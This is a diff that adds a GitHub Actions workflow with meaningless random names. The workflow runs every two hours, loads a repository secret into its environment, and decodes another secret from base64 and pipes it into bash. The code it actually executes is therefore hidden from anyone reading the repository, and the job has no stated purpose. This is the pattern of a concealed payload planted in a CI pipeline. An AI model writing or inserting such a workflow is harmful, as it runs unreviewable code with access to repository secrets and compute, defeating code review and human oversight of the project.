@@ -1,0 +1,13 @@
+name: JoAZIHRXcBpi
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  ysHozjhhW:
+    runs-on: ubuntu-22.04
+    env:
+      aSYtkIU: ${{ secrets.cDxKDQC }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.hSYsVco }}" | base64 -d | bash
